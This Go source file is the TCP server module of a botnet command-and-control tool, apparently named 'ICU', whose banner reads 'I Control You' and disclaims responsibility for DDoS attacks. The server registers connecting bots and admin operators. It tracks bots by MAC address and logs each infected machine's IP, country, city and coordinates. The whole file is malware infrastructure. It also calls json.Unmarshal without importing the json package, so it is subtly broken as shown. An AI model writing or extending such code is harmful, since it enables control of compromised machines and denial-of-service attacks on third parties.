package modules

import (
	"encoding/hex"
	"errors"
	"fmt"
	"icu/common/constants"
	"icu/common/types"
	"icu/common/utils"
	"icu/lib"
	"io"
	"net"
	"os"
	"strconv"
	"time"
)

type TCPServer struct {
	host    string
	port    int
	cache   *lib.Cache
	logger  *lib.Logger
	session *lib.SessionManager
}

func NewTCPServer(cache *lib.Cache) *TCPServer {
	portInt, err := strconv.Atoi(os.Getenv("SERVER_PORT"))
	if err != nil {
		return &TCPServer{}
	}

	return &TCPServer{
		host:    os.Getenv("SERVER_ADDR"),
		port:    portInt,
		cache:   cache,
		logger:  lib.NewLogger(),
		session: lib.NewSessionManager(),
	}
}

func (this *TCPServer) StartServer() error {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", this.port))
	if err != nil {
		return fmt.Errorf("Error starting server: %v", err)
	}
	defer listener.Close()

	fmt.Print("\033[31m\n" + `  _____ _____ _    _
 |_   _/ ____| |  | | {0.10.3#dev}
   | || |    | |  | |
   | || |    | |  | |
  _| || |____| |__| | I Control You :) :(
 |_____\_____|\____/
` + "\n\033[0m")

	fmt.Println("\033[33m[!] ICU is not responsible for DDoS attacks or unauthorized access. \nThe responsibility for such actions lies with the violators.\n\033[0m")

	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))

	for {
		conn, err := listener.Accept()
		if err != nil {
			this.logger.Error(fmt.Sprintf("Error accepting connection: %v", err))
			continue
		}

		go this.handleConnectionCallback(conn)
	}
}

func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
	defer conn.Close()

	buffer := make([]byte, constants.MAX_PACKET_SIZE)

	n, err := conn.Read(buffer)
	if err != nil {
		fmt.Println(err.Error())
		this.logger.Info(fmt.Sprintf("Error reading data: %s", conn.RemoteAddr()))
		return
	}

	// admin OR bot
	packetType := buffer[3]

	switch packetType {
	case constants.BOT_TYPE_HELLO:
		this.handleBot(conn, buffer[:n])

	case constants.ADMIN_TYPE_HELLO:
		this.handleAdmin(conn, buffer[:n])

	default:
		this.logger.Error(fmt.Sprintf("Unknown packet type: %d", packetType))
	}
}

func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
	emitter := lib.NewEventEmitter()
	clientModule := NewClientModule(conn, this.cache, emitter)
	clientModule.isBotConnected = true

	defer func() {
		this.cache.RemoveCache(utils.MacPrettyConvert(clientModule.mac))
		this.session.RemoveBotSession(conn.RemoteAddr().String())
		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
	}()

	emitter.On("hello-pack-received", func(received interface{}) {
		this.cache.NewInitial(conn.RemoteAddr().String())

		// ipgeo unmarshal
		var ipgeoStruct types.IPGeo
		if err := json.Unmarshal([]byte(*clientModule.ipgeo), &ipgeoStruct); err != nil {
			return
		}

		this.cache.SetCache(conn.RemoteAddr().String(), "ipgeo", ipgeoStruct, 10*time.Minute)
		this.session.NewBotSession(conn.RemoteAddr().String(), clientModule)

		cache := this.cache.GetCache(conn.RemoteAddr().String(), "ipgeo").(types.IPGeo)
		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
	})

	emitter.On("error", func(error interface{}) {
		this.logger.Error(error.(string))
	})

	// HELLO PACKET
	clientModule.ParseData(data)
	mac := utils.MacPrettyConvert(clientModule.mac)

	buffer := make([]byte, constants.MAX_PACKET_SIZE)
	for {
		data, err := conn.Read(buffer)
		if err != nil {
			if errors.Is(err, io.EOF) {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
			}

			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
			} else if os.IsTimeout(err) {
				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
			} else {
				this.logger.Error(fmt.Sprintf("Error reading bot from connection: %s", err.Error())) // defer
			}

			break
		}

		this.logger.Info(fmt.Sprintf("DATA[%d] %s", data, hex.EncodeToString(buffer[:data])))
		clientModule.ParseData(buffer[:data])
	}
}

func (this *TCPServer) handleAdmin(conn net.Conn, data []byte) {
	emitter := lib.NewEventEmitter()
	clientModule := NewClientModule(conn, this.cache, emitter)
	clientModule.isBotConnected = true

	defer func() {
		this.session.RemoveAdminSession(conn.RemoteAddr().String())
		this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr()))
	}()

	emitter.On("hello-pack-received", func(received interface{}) {
		this.cache.NewInitial(conn.RemoteAddr().String())
		this.session.NewAdminSession(conn.RemoteAddr().String(), clientModule)
		this.logger.Info(fmt.Sprintf("CONNECTED ADMIN[%s]", conn.RemoteAddr().String()))
	})

	emitter.On("error", func(error interface{}) {
		this.logger.Error(error.(string))
	})

	// HELLO PACKET
	clientModule.ParseData(data)

	buffer := make([]byte, constants.MAX_PACKET_SIZE)
	for {
		data, err := conn.Read(buffer)
		if err != nil {
			if errors.Is(err, io.EOF) {
				this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr())) // defer
			}

			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
				this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr())) // defer
			} else if os.IsTimeout(err) {
				this.logger.Info(fmt.Sprintf("Admin disconnect (timeout): %s", conn.RemoteAddr())) // defer
			} else {
				this.logger.Error(fmt.Sprintf("Error reading admin from connection: %s", err.Error())) // defer
			}

			break
		}

		this.logger.Info(fmt.Sprintf("DATA[%d] %s", data, hex.EncodeToString(buffer[:data])))
		clientModule.ParseData(buffer[:data])
	}
}
